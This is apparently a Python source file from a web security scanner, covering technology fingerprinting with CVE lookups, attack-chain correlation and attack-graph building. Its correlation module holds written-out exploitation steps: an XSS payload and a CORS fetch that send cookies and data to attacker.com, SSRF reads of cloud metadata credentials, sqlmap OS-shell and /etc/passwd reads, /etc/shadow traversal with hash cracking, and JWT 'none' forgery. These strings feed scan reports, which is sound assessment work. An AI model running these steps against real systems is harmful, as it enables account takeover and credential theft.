"""Web security modules — Tech fingerprinting, correlation, attack graph."""
import re
import json
import os
import time
import socket
import secrets
import struct
import base64
import hashlib
import hmac
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from scanner.state import scan_state, LOCK
from scanner.findings import add_finding, set_progress
from core.utils import _find_tool, _run_tool, req_lib, REQUESTS_AVAILABLE, BS4_AVAILABLE, BeautifulSoup
from core.logger import log
from scanner.modules.web.headers import TECH_PATTERNS

def run_tech_module(target):
    log('info', f'[TECH] Detecting technologies for {target}')
    tech_data = {'technologies': [], 'outdated': [], 'vulnerabilities': []}
    collected = set()
    try:
        if REQUESTS_AVAILABLE:
            # Check multiple pages for better detection
            urls_to_check = [
                f'https://{target}',
                f'https://{target}/login',
                f'https://{target}/admin',
                f'https://{target}/api',
            ]

            for url in urls_to_check:
                try:
                    r = req_lib.get(url, timeout=8, verify=False, headers={'User-Agent': 'Mozilla/5.0 INFOSEC Recon'}, allow_redirects=True)
                    body = r.text[:100000]
                    headers_str = str(r.headers)
                    combined = body + '\n' + headers_str

                    # Also check response headers individually
                    for header_name, header_value in r.headers.items():
                        combined += f'\n{header_name}: {header_value}'

                    for key, name, category, patterns in TECH_PATTERNS:
                        if name in collected:
                            continue
                        for pat in patterns:
                            m = re.search(pat, combined, re.IGNORECASE)
                            if m:
                                ver = m.group(1) if m.lastindex and m.group(1) else 'detected'

                                # Clean version string
                                if ver and ver != 'detected':
                                    ver = ver.strip('.')

                                tech_entry = {
                                    'name': name,
                                    'version': ver,
                                    'category': category,
                                    'confidence': 'high' if ver != 'detected' else 'medium',
                                    'source': url
                                }

                                collected.add(name)
                                tech_data['technologies'].append(tech_entry)
                                log('ok', f'[TECH] Detected: {name} {ver} ({category})')

                                # Check for known vulnerabilities
                                if ver and ver != 'detected' and key in VULNERABLE_VERSIONS:
                                    for vuln_ver, vuln_info in VULNERABLE_VERSIONS[key].items():
                                        if ver.startswith(vuln_ver.rsplit('.', 1)[0]):
                                            cve_id, description = vuln_info
                                            tech_data['vulnerabilities'].append({
                                                'technology': name,
                                                'version': ver,
                                                'cve': cve_id,
                                                'description': description,
                                                'severity': 'critical' if 'RCE' in description or 'CRITICAL' in description else 'high'
                                            })
                                            add_finding(
                                                'critical' if 'RCE' in description or 'CRITICAL' in description else 'high',
                                                f'Outdated {name} v{ver} - {cve_id}',
                                                sub=f'{name} version {ver} has known vulnerability: {description}',
                                                asset=target, cve=cve_id,
                                                cvss='9.8' if 'RCE' in description else '7.5',
                                                exploit='PUBLIC', owasp='A06', mitre='T1190',
                                                details=f'Detected {name} version {ver} which is affected by {cve_id}: {description}. '
                                                        f'Immediate update is recommended to patch this security vulnerability.'
                                            )
                                            log('err', f'[TECH] VULNERABLE: {name} v{ver} - {cve_id}: {description}')
                                break

                    # Check for outdated versions (no CVE but old)
                    for tech in tech_data['technologies']:
                        if tech['version'] and tech['version'] != 'detected':
                            # Check if version is very old (e.g., major version < current - 2)
                            try:
                                major = int(tech['version'].split('.')[0])
                                if tech['name'] == 'PHP' and major < 8:
                                    tech_data['outdated'].append({
                                        'name': tech['name'],
                                        'version': tech['version'],
                                        'recommendation': 'Upgrade to PHP 8.x for security and performance'
                                    })
                                elif tech['name'] == 'Nginx' and major < 1:
                                    tech_data['outdated'].append({
                                        'name': tech['name'],
                                        'version': tech['version'],
                                        'recommendation': 'Upgrade to latest stable Nginx version'
                                    })
                                elif tech['name'] == 'Apache HTTP Server' and major < 2:
                                    tech_data['outdated'].append({
                                        'name': tech['name'],
                                        'version': tech['version'],
                                        'recommendation': 'Upgrade to Apache 2.4.x or later'
                                    })
                            except (ValueError, IndexError):
                                pass

                except Exception as e:
                    log('debug', f'[TECH] Failed to check {url}: {e}')

            # Additional detection from page source
            try:
                r = req_lib.get(f'https://{target}', timeout=8, verify=False)
                soup = BeautifulSoup(r.text, 'html.parser') if BeautifulSoup else None

                if soup:
                    # Check meta tags
                    for meta in soup.find_all('meta'):
                        generator = meta.get('name', '').lower()
                        if generator == 'generator':
                            content = meta.get('content', '')
                            if content and content not in collected:
                                collected.add(content)
                                tech_data['technologies'].append({
                                    'name': content.split(' ')[0],
                                    'version': 'detected',
                                    'category': 'CMS/Generator',
                                    'confidence': 'high',
                                    'source': 'meta generator'
                                })

                    # Check script sources for more JS libraries
                    for script in soup.find_all('script', src=True):
                        src = script['src']
                        for key, name, category, patterns in TECH_PATTERNS:
                            if name not in collected:
                                for pat in patterns:
                                    if re.search(pat, src, re.IGNORECASE):
                                        collected.add(name)
                                        tech_data['technologies'].append({
                                            'name': name,
                                            'version': 'detected',
                                            'category': category,
                                            'confidence': 'medium',
                                            'source': f'script: {src[:50]}'
                                        })
                                        break

            except Exception as e:
                log('debug', f'[TECH] Additional detection failed: {e}')

            # Summary
            total = len(tech_data['technologies'])
            outdated = len(tech_data['outdated'])
            vulns = len(tech_data['vulnerabilities'])
            log('ok', f'[TECH] Detected {total} technologies, {outdated} outdated, {vulns} with known vulnerabilities')

            # NVD CVE enrichment for detected technologies
            tech_data['nvd_cves'] = []
            existing_cve_ids = set(v['cve'] for v in tech_data['vulnerabilities'])
            for tech in tech_data['technologies']:
                if tech.get('version') and tech['version'] != 'detected':
                    nvd_results = run_nvd_lookup(tech['name'], tech['version'])
                    for cve in nvd_results:
                        if cve['cve'] not in existing_cve_ids:
                            existing_cve_ids.add(cve['cve'])
                            tech_data['nvd_cves'].append({
                                'technology': tech['name'],
                                'version': tech['version'],
                                'cve': cve['cve'],
                                'cvss': cve['cvss'],
                                'description': cve['desc'],
                                'category': tech.get('category', 'Unknown')
                            })
                            add_finding('high', f'{tech["name"]} v{tech["version"]} - {cve["cve"]}',
                                sub=f'NVD: {cve["desc"]}',
                                asset=target, cve=cve['cve'], cvss=cve['cvss'],
                                exploit='CHECK', owasp='A06', mitre='T1190',
                                details=f'NVD lookup found {cve["cve"]} (CVSS {cve["cvss"]}) for {tech["name"]} version {tech["version"]}: {cve["desc"]}')
                            # SearchExploit: look for public exploits
                            try:
                                exploits = run_searchsploit(cve_id=cve['cve'])
                                if exploits:
                                    sev = 'critical' if cve.get('cvss', 0) >= 7.0 else 'high'
                                    add_finding(sev, f'Public exploit available: {cve["cve"]}',
                                        sub=f'ExploitDB: {exploits[0]["title"]}',
                                        asset=target, cve=cve['cve'], cvss=cve['cvss'],
                                        exploit='PUBLIC', owasp='A06', mitre='T1190',
                                        details=f'ExploitDB match for {cve["cve"]}:\n'
                                                f'Title: {exploits[0]["title"]}\n'
                                                f'EDB-ID: {exploits[0]["edb_id"]}\n'
                                                f'Path: {exploits[0]["path"]}')
                                    log('ok', f'[SEARCHSPLOIT] Public exploit for {cve["cve"]}: {exploits[0]["title"]}')
                            except Exception:
                                pass
            if tech_data['nvd_cves']:
                log('ok', f'[TECH] NVD lookup found {len(tech_data["nvd_cves"])} additional CVEs')

            # Add finding if outdated tech detected
            if outdated > 0:
                add_finding('medium', f'{outdated} outdated technologies detected',
                    sub=f'Found {outdated} technologies that should be updated',
                    asset=target, cvss='5.0', owasp='A06', mitre='T1190',
                    details='The following technologies are outdated:\n' +
                            '\n'.join([f'- {t["name"]} {t["version"]}: {t["recommendation"]}' for t in tech_data['outdated'][:5]])
                )

    except Exception as e:
        log('err', f'[TECH] Module error: {e}')
    with LOCK:
        scan_state['tech_data'] = tech_data
    # Enhanced tech detection with httpx
    httpx_path = _find_tool('httpx')
    if httpx_path:
        log('info', f'[TECH] Running httpx for enhanced technology detection')
        stdout, stderr, rc = _run_tool([
            httpx_path, '-u', target, '-title', '-tech-detect',
            '-status-code', '-follow-redirects', '-silent', '-json'
        ], timeout=30)
        if rc == 0 and stdout:
            try:
                import json as _json
                for line in stdout.strip().split('\n'):
                    if line.strip():
                        data = _json.loads(line)
                        httpx_techs = data.get('tech', [])
                        if httpx_techs:
                            with LOCK:
                                existing = scan_state.get('tech_data', {}).get('technologies', [])
                                for t in httpx_techs:
                                    if t not in [x.get('name', '') for x in existing]:
                                        scan_state['tech_data']['technologies'].append({'name': t, 'version': '', 'confidence': 'high'})
                            log('ok', f'[TECH] httpx detected: {", ".join(httpx_techs[:5])}')
            except Exception:
                pass
    set_progress('tech', 100)

# ─── WHOIS MODULE ──────────────────────────────────────────────────────────────


def run_correlation_module(target):
    with LOCK:
        findings = list(scan_state.get('findings', []))
    log('info', f'[CORRELATION] Building attack chains from {len(findings)} findings')
    chains = []

    # ═══════════════════════════════════════════════════════════════════════════════
    # ATTACK CHAIN PATTERNS — Each pattern is a multi-step exploitation path
    # ═══════════════════════════════════════════════════════════════════════════════

    # Chain Pattern 1: Open Redirect → Phishing → Credential Theft
    open_redirects = [f for f in findings if 'open redirect' in f.get('title', '').lower()]
    missing_csrf = [f for f in findings if 'csrf' in f.get('title', '').lower()]
    weak_creds = [f for f in findings if 'weak' in f.get('title', '').lower() or 'default credential' in f.get('title', '').lower()]
    if open_redirects and missing_csrf:
        chains.append({
            'id': 'CHAIN-001',
            'name': 'Redirect + CSRF → Account Takeover',
            'severity': 'critical',
            'description': 'Open redirect chains with CSRF to steal user sessions',
            'steps': [
                'Attacker crafts phishing URL with open redirect → victim clicks',
                'Redirect lands on vulnerable form without CSRF token',
                'Attacker submits malicious form (email change, password reset)',
                'Attacker gains control of victim account',
            ],
            'findings': [f['id'] for f in open_redirects[:1]] + [f['id'] for f in missing_csrf[:1]],
            'mitre': ['T1566', 'T1078'],
            'impact': 'Full account takeover',
            'exploitation_steps': [
                f'1. Craft phishing URL: {open_redirects[0]["asset"]}?url=https://target.com/login',
                f'2. Host malicious page that auto-submits CSRF form',
                f'3. Send phishing link to victim via email',
                f'4. Victim gets redirected and auto-submits form',
                f'5. Attacker receives credentials or session token',
            ]
        })

    # Chain Pattern 2: Information Disclosure → Credential Leak → Admin Access
    info_disc = [f for f in findings if any(kw in f.get('title', '').lower() for kw in
                 ['information disclosure', 'debug', 'stack trace', 'version', '.env', 'config'])]
    exposed_creds = [f for f in findings if any(kw in f.get('title', '').lower() for kw in
                     ['credential', 'secret', 'api key', 'token', 'password'])]
    admin_panels = [f for f in findings if any(kw in f.get('title', '').lower() for kw in
                    ['admin', 'panel', 'dashboard', 'console'])]
    if info_disc and exposed_creds:
        chains.append({
            'id': 'CHAIN-002',
            'name': 'Info Leak → Credential Theft → Admin Access',
            'severity': 'critical',
            'description': 'Information disclosure reveals credentials that grant admin access',
            'steps': [
                'Information disclosure reveals version/config/debug data',
                'Debug/config pages expose API keys, database credentials, or admin tokens',
                'Stolen credentials used to access admin panel',
                'Full application compromise',
            ],
            'findings': [f['id'] for f in info_disc[:2]] + [f['id'] for f in exposed_creds[:1]],
            'mitre': ['T1592', 'T1552', 'T1078'],
            'impact': 'Full application compromise',
            'exploitation_steps': [
                f'1. Enumerate: curl -s {info_disc[0]["asset"]} | grep -i "version\\\\|debug\\\\|config"',
                f'2. Access debug endpoint: {info_disc[0]["asset"]}/debug',
                f'3. Extract credentials from exposed config',
                f'4. Use credentials to access admin panel',
                f'5. Establish persistent access',
            ]
        })

    # Chain Pattern 3: SSRF → Cloud Metadata → IAM → Cloud Takeover
    ssrf_findings = [f for f in findings if 'ssrf' in f.get('title', '').lower()]
    cloud_findings = [f for f in findings if any(kw in f.get('title', '').lower() for kw in
                     ['cloud', 's3', 'bucket', 'metadata', 'iam'])]
    if ssrf_findings and cloud_findings:
        chains.append({
            'id': 'CHAIN-003',
            'name': 'SSRF → Cloud Metadata → IAM → Cloud Takeover',
            'severity': 'critical',
            'description': 'SSRF accesses cloud metadata, steals IAM credentials, takes over cloud',
            'steps': [
                'SSRF vulnerability allows fetching http://169.254.169.254/latest/meta-data/',
                'Instance metadata reveals IAM role name',
                'IAM role credentials (AccessKeyId, SecretAccessKey, Token) extracted',
                'Attacker configures AWS CLI with stolen credentials',
                'Enumerates and exfiltrates all accessible cloud resources',
            ],
            'findings': [f['id'] for f in ssrf_findings[:1]] + [f['id'] for f in cloud_findings[:1]],
            'mitre': ['T918', 'T1552', 'T1078'],
            'impact': 'Full cloud environment compromise',
            'exploitation_steps': [
                f'1. Access metadata: {ssrf_findings[0]["asset"]}?url=http://169.254.169.254/latest/meta-data/',
                f'2. Get IAM role: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                f'3. Get creds: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>',
                f'4. aws configure (paste AccessKeyId, SecretAccessKey, Token)',
                f'5. aws s3 ls && aws ec2 describe-instances && aws iam list-roles',
            ]
        })

    # Chain Pattern 4: SQLi → Data Exfiltration → Lateral Movement
    sqli_findings = [f for f in findings if 'sql' in f.get('title', '').lower() or 'injection' in f.get('title', '').lower()]
    if sqli_findings:
        chains.append({
            'id': 'CHAIN-004',
            'name': 'SQL Injection → Data Exfiltration → Lateral Movement',
            'severity': 'critical',
            'description': 'SQL injection allows full database dump and potentially OS command execution',
            'steps': [
                'SQL injection confirmed on parameter',
                'Enumerate database structure (tables, columns)',
                'Extract sensitive data (credentials, PII, tokens)',
                'Attempt OS shell via xp_cmdshell or UNION INTO OUTFILE',
                'Pivot to internal network using database server as staging point',
            ],
            'findings': [f['id'] for f in sqli_findings[:1]],
            'mitre': ['T1190', 'T1505', 'T1005'],
            'impact': 'Full database compromise, potential OS access',
            'exploitation_steps': [
                f'1. Confirm: sqlmap -u "{sqli_findings[0]["asset"]}" --batch --risk=2 --level=3',
                f'2. Dump all: sqlmap -u "{sqli_findings[0]["asset"]}" --batch --all',
                f'3. OS shell: sqlmap -u "{sqli_findings[0]["asset"]}" --batch --os-shell',
                f'4. Read files: sqlmap -u "{sqli_findings[0]["asset"]}" --batch --file-read=/etc/passwd',
            ]
        })

    # Chain Pattern 5: XSS → Session Hijacking → Account Takeover
    xss_findings = [f for f in findings if 'xss' in f.get('title', '').lower() or 'cross-site' in f.get('title', '').lower()]
    if xss_findings and missing_csrf:
        chains.append({
            'id': 'CHAIN-005',
            'name': 'XSS → Session Hijacking → Account Takeover',
            'severity': 'high',
            'description': 'XSS steals session cookies, attacker impersonates victim',
            'steps': [
                'XSS confirmed on parameter/page',
                'Craft payload to exfiltrate cookies: <script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
                'Victim triggers XSS (clicks link, views page)',
                'Attacker receives session cookie',
                'Attacker uses cookie to access victim account',
            ],
            'findings': [f['id'] for f in xss_findings[:1]] + [f['id'] for f in missing_csrf[:1]],
            'mitre': ['T1189', 'T1539'],
            'impact': 'Session hijacking, account takeover',
            'exploitation_steps': [
                f'1. Test: {xss_findings[0]["asset"]}?param=<script>alert(1)</script>',
                f'2. Steal cookie: ?param=<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
                f'3. Set up listener: nc -lvnp 80',
                f'4. Send crafted URL to victim',
                f'5. Use stolen cookie: curl -b "session=<STOLEN>" {xss_findings[0]["asset"]}/admin',
            ]
        })

    # Chain Pattern 6: Path Traversal → Config Read → Credential Theft
    traversal_findings = [f for f in findings if any(kw in f.get('title', '').lower() for kw in
                         ['path traversal', 'directory traversal', 'lfi'])]
    if traversal_findings:
        chains.append({
            'id': 'CHAIN-006',
            'name': 'Path Traversal → Config/Password File Read',
            'severity': 'critical',
            'description': 'Directory traversal reads /etc/passwd, config files, and credential stores',
            'steps': [
                'Path traversal confirmed via file read',
                'Read /etc/passwd to enumerate users',
                'Read application config for DB credentials',
                'Read SSH keys or shadow file for password cracking',
                'Pivot using discovered credentials',
            ],
            'findings': [f['id'] for f in traversal_findings[:1]],
            'mitre': ['T1083', 'T1552'],
            'impact': 'Credential theft, full system compromise',
            'exploitation_steps': [
                f'1. Read passwd: {traversal_findings[0]["asset"]}?file=../../../etc/passwd',
                f'2. Read config: {traversal_findings[0]["asset"]}?file=../../../var/www/html/.env',
                f'3. Read shadow: {traversal_findings[0]["asset"]}?file=../../../etc/shadow',
                f'4. Crack hashes: unshadow /etc/passwd /etc/shadow > hashes.txt && john hashes.txt',
            ]
        })

    # Chain Pattern 7: GraphQL Introspection → Schema Leak → Injection
    graphql_findings = [f for f in findings if 'graphql' in f.get('title', '').lower()]
    if graphql_findings:
        chains.append({
            'id': 'CHAIN-007',
            'name': 'GraphQL Introspection → Schema Leak → Injection',
            'severity': 'high',
            'description': 'GraphQL introspection reveals schema, enabling targeted injection attacks',
            'steps': [
                'GraphQL introspection enabled — full schema accessible',
                'Download schema: { __schema { types { name fields { name type { name } } } } }',
                'Identify sensitive fields (users, tokens, admin)',
                'Craft targeted queries for data exfiltration',
                'Test each field for injection (SQLi, NoSQL, IDOR)',
            ],
            'findings': [f['id'] for f in graphql_findings[:1]],
            'mitre': ['T1592', 'T1190'],
            'impact': 'Full data exfiltration via GraphQL',
            'exploitation_steps': [
                f'1. Introspect: curl -X POST {graphql_findings[0]["asset"]} -H "Content-Type: application/json" -d \'{{"query":"{{ __schema {{ types {{ name fields {{ name }} }} }} }}"}}\'',
                f'2. Enumerate users: {{ users {{ id email role }} }}',
                f'3. Dump data: {{ allData {{ sensitiveField }} }}',
            ]
        })

    # Chain Pattern 8: Cloud Bucket → Data Breach → Compliance Violation
    exposed_buckets = [f for f in findings if any(kw in f.get('title', '').lower() for kw in
                      ['bucket', 's3', 'gcp', 'azure blob', 'cloud'])]
    if exposed_buckets:
        chains.append({
            'id': 'CHAIN-008',
            'name': 'Cloud Storage Exposure → Data Breach',
            'severity': 'critical',
            'description': 'Publicly accessible cloud storage bucket exposes sensitive data',
            'steps': [
                'Cloud storage bucket is publicly accessible',
                'Enumerate bucket contents via listing',
                'Download all files (PII, credentials, backups)',
                'Check for GDPR/PCI/HIPAA compliance violations',
            ],
            'findings': [f['id'] for f in exposed_buckets[:2]],
            'mitre': ['T1613', 'T1530'],
            'impact': 'Mass data exfiltration, compliance violation',
            'exploitation_steps': [
                f'1. List bucket: aws s3 ls s3://{exposed_buckets[0]["asset"]}',
                f'2. Download all: aws s3 sync s3://{exposed_buckets[0]["asset"]} ./loot',
                f'3. Check for creds: find ./loot -name "*.env" -o -name "*.key" -o -name "*.pem"',
            ]
        })

    # Chain Pattern 9: CORS Misconfiguration → CSRF → Account Takeover
    cors_findings = [f for f in findings if 'cors' in f.get('title', '').lower()]
    if cors_findings and missing_csrf:
        chains.append({
            'id': 'CHAIN-009',
            'name': 'CORS Misconfiguration → CSRF → Data Theft',
            'severity': 'high',
            'description': 'Overly permissive CORS allows cross-origin CSRF attacks',
            'steps': [
                'CORS misconfiguration: Access-Control-Allow-Origin reflects attacker domain',
                'Access-Control-Allow-Credentials: true allows cookie inclusion',
                'Attacker hosts malicious page that makes cross-origin requests',
                'Victim visits attacker page — browser sends cookies automatically',
                'Attacker reads response data or submits forged requests',
            ],
            'findings': [f['id'] for f in cors_findings[:1]] + [f['id'] for f in missing_csrf[:1]],
            'mitre': ['T1189', 'T1071'],
            'impact': 'Cross-origin data theft, CSRF',
            'exploitation_steps': [
                f'1. Craft attacker page: fetch("{cors_findings[0]["asset"]}/api/user", {{credentials:"include"}}).then(r=>r.json()).then(d=>fetch("https://attacker.com/steal",{{method:"POST",body:JSON.stringify(d)}}))',
                f'2. Host on attacker.com',
                f'3. Send link to victim',
                f'4. Receive exfiltrated data on attacker server',
            ]
        })

    # Chain Pattern 10: JWT None Algorithm → Auth Bypass → Admin
    jwt_findings = [f for f in findings if 'jwt' in f.get('title', '').lower()]
    if jwt_findings:
        chains.append({
            'id': 'CHAIN-010',
            'name': 'JWT None Algorithm → Auth Bypass → Admin',
            'severity': 'critical',
            'description': 'JWT accepts none algorithm, allowing token forgery and admin impersonation',
            'steps': [
                'JWT token uses HS256/RS256 but server accepts "none" algorithm',
                'Forge token with alg:none and admin claims',
                'Send forged token in Authorization header',
                'Server accepts unsigned token — full admin access',
            ],
            'findings': [f['id'] for f in jwt_findings[:1]],
            'mitre': ['T1550', 'T1078'],
            'impact': 'Full authentication bypass',
            'exploitation_steps': [
                f'1. Decode: echo <token> | cut -d. -f2 | base64 -d',
                f'2. Forge header: {{"alg":"none","typ":"JWT"}}',
                f'3. Forge payload: {{"role":"admin","user":"attacker"}}',
                f'4. Sign: python3 -c "import base64; print(base64.urlsafe_b64encode(b\'{{"alg":"none","typ":"JWT"}}\').rstrip(b\'=\').decode())"',
                f'5. Send: curl -H "Authorization: Bearer <forged>" {jwt_findings[0]["asset"]}/admin',
            ]
        })

    # Tag findings with chain IDs
    all_chained_ids = set()
    for chain in chains:
        for fid in chain.get('findings', []):
            all_chained_ids.add(fid)
        # Update finding with chain_id
        with LOCK:
            for f in scan_state['findings']:
                if f['id'] in chain['findings']:
                    f['chain_id'] = chain['id']

    # ── Summary ──
    critical_chains = [c for c in chains if c.get('severity') == 'critical']
    log('ok', f'[CORRELATION] Built {len(chains)} attack chains ({len(critical_chains)} critical)')
    with LOCK:
        scan_state['correlation_chains'] = chains
    set_progress('correlation', 100)

# ─── VULN SCAN MODULE ──────────────────────────────────────────────────────────


def run_graph_module(target):
    log('info', f'[GRAPH] Building comprehensive attack graph for {target}')
    with LOCK:
        findings = list(scan_state.get('findings', []))
        ports = list(scan_state.get('port_data', []))
        assets = list(scan_state.get('assets', []))
        cloud_data = dict(scan_state.get('cloud_data', {}))
        supplychain_data = dict(scan_state.get('supplychain_data', {}))

    nodes = [{'id': target, 'label': target, 'group': 'target', 'value': 30, 'risk_score': 0}]
    edges = []
    attack_paths = []

    # ── Add Port Nodes ──
    for p in ports[:15]:
        pid = f'port_{p["port"]}'
        port_risk = 'high' if p.get('port') in (23, 445, 3389, 3306, 6379, 27017) else 'medium' if p.get('port') in (80, 443, 8080) else 'low'
        nodes.append({
            'id': pid,
            'label': f'{p["port"]}/{p["service"]}',
            'group': 'port',
            'value': 15,
            'risk_level': port_risk,
            'service': p.get('service', ''),
            'version': p.get('version', '')
        })
        edges.append({'from': target, 'to': pid, 'label': 'exposes'})

    # ── Add Asset Nodes ──
    for a in assets[:15]:
        fid = a.get('fqdn', '')
        if fid:
            nodes.append({
                'id': fid,
                'label': fid,
                'group': 'asset',
                'value': 20,
                'ips': a.get('ips', []),
                'status': a.get('status', '')
            })
            edges.append({'from': target, 'to': fid, 'label': 'subdomain'})

    # ── Add Finding Nodes with Risk Propagation ──
    sev_map = {'critical': 'finding-critical', 'high': 'finding-high', 'medium': 'finding-medium', 'low': 'finding-low'}
    for f in findings[:25]:
        fid = f.get('id', '')
        sev = f.get('sev', 'low')
        cvss_raw = f.get('cvss', 0)
        try:
            cvss = float(cvss_raw) if cvss_raw not in (None, '', 'None', 'none') else 0.0
        except (ValueError, TypeError):
            cvss = 0.0
        nodes.append({
            'id': fid,
            'label': f.get('title', '')[:30],
            'group': sev_map.get(sev, 'finding-low'),
            'value': 12 + int(cvss * 2),
            'severity': sev,
            'cvss': cvss,
            'owasp': f.get('owasp', ''),
            'mitre': f.get('mitre', ''),
            'asset': f.get('asset', '')
        })
        edges.append({'from': target, 'to': fid, 'label': sev, 'weight': cvss})

    # ── Add Cloud Asset Nodes ──
    for bucket in cloud_data.get('exposed_buckets', [])[:5]:
        bid = f'cloud_{bucket.get("bucket", "unknown")}'
        nodes.append({
            'id': bid,
            'label': f'Cloud: {bucket.get("bucket", "")}',
            'group': 'cloud',
            'value': 25,
            'provider': bucket.get('provider', ''),
            'public': bucket.get('public', False)
        })
        edges.append({'from': target, 'to': bid, 'label': 'cloud暴露'})

    # ── Add Supply Chain Nodes ──
    for dep in supplychain_data.get('vulnerable_dependencies', [])[:5]:
        did = f'dep_{dep.get("library", "unknown")}'
        nodes.append({
            'id': did,
            'label': f'Dep: {dep.get("library", "")}',
            'group': 'supplychain',
            'value': 18,
            'cve': dep.get('cve', ''),
            'cvss': dep.get('cvss', '')
        })
        edges.append({'from': target, 'to': did, 'label': 'uses'})

    # ── Attack Path Analysis ──
    log('info', '[GRAPH] Analyzing attack paths')
    critical_findings = [f for f in findings if f.get('sev') == 'critical']
    high_findings = [f for f in findings if f.get('sev') == 'high']

    # Use correlation chains as primary attack paths
    with LOCK:
        correlation_chains = list(scan_state.get('correlation_chains', []))

    for chain in correlation_chains:
        chain_findings = [f for f in findings if f['id'] in chain.get('findings', [])]
        path_nodes = [target] + [f.get('id', '') for f in chain_findings]
        attack_paths.append({
            'id': chain.get('id', f'PATH-{len(attack_paths)+1}'),
            'name': chain.get('name', 'Attack Chain'),
            'description': chain.get('description', ''),
            'nodes': path_nodes,
            'risk_score': chain.get('risk_score', 9.0),
            'mitre_chain': chain.get('mitre', []),
            'impact': chain.get('impact', 'Full compromise'),
            'steps': chain.get('steps', []),
            'exploitation_steps': chain.get('exploitation_steps', []),
        })

    # Fallback: if no chains found, create basic paths from critical/high findings
    if not attack_paths and critical_findings:
        path_nodes = [target] + [f.get('id', '') for f in critical_findings[:3]]
        attack_paths.append({
            'id': 'PATH-001',
            'name': 'Critical Vulnerability Exploitation',
            'description': 'Direct exploitation of critical vulnerabilities',
            'nodes': path_nodes,
            'risk_score': sum(
                (float(f.get('cvss', 0)) if f.get('cvss') not in (None, '', 'None', 'none') else 0.0)
                for f in critical_findings[:3]
            ),
            'mitre_chain': [f.get('mitre', '') for f in critical_findings[:3]],
            'impact': 'Full system compromise',
            'exploitation_steps': [],
        })

    # ── Risk Propagation Analysis ──
    log('info', '[GRAPH] Calculating risk propagation')
    risk_propagation = {
        'total_risk_score': 0,
        'critical_paths': len(attack_paths),
        'highest_risk_path': None,
        'risk_factors': []
    }
    if attack_paths:
        max_risk_path = max(attack_paths, key=lambda x: x.get('risk_score', 0))
        risk_propagation['highest_risk_path'] = max_risk_path['id']
        risk_propagation['total_risk_score'] = sum(p.get('risk_score', 0) for p in attack_paths)
        for path in attack_paths:
            risk_propagation['risk_factors'].append({
                'path': path['name'],
                'risk_score': path['risk_score'],
                'impact': path['impact']
            })

    # ── Graph Statistics ──
    graph_stats = {
        'total_nodes': len(nodes),
        'total_edges': len(edges),
        'attack_paths': len(attack_paths),
        'critical_nodes': len([n for n in nodes if n.get('group') == 'finding-critical']),
        'high_risk_nodes': len([n for n in nodes if n.get('group') == 'finding-high']),
        'cloud_assets': len([n for n in nodes if n.get('group') == 'cloud']),
        'supply_chain_deps': len([n for n in nodes if n.get('group') == 'supplychain']),
    }

    graph = {
        'nodes': nodes,
        'edges': edges,
        'attack_paths': attack_paths,
        'risk_propagation': risk_propagation,
        'stats': graph_stats,
        'scan_mode': 'active'
    }

    log('ok', f'[GRAPH] Built graph: {len(nodes)} nodes, {len(edges)} edges, {len(attack_paths)} attack paths')
    with LOCK:
        scan_state['graph_data'] = graph
    set_progress('graph', 100)

# ─── GITHUB LEAK MODULE ────────────────────────────────────────────────────────
